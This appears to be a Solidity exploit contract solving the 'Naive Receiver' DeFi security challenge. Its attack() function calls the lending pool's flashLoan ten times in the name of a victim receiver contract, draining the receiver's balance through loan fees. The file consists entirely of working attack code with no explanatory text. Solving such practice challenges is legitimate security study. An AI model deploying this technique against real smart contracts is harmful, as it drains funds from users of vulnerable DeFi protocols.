// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {NaiveReceiverLenderPool} from "./NaiveReceiverLenderPool.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract Attack {
    NaiveReceiverLenderPool public naiveReceiverLenderPool;
    address public receiver;

    constructor(address payable _addr, address _receiver) {
        naiveReceiverLenderPool = NaiveReceiverLenderPool(_addr);
        receiver = _receiver;
    }

    function attack() public {
        // for loop call flashloan 10 times
        for (uint256 i = 0; i < 10; i++) {
            naiveReceiverLenderPool.flashLoan(
                IERC3156FlashBorrower(receiver),
                0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE,
                1,
                "0x"
            );
        }
    }
}
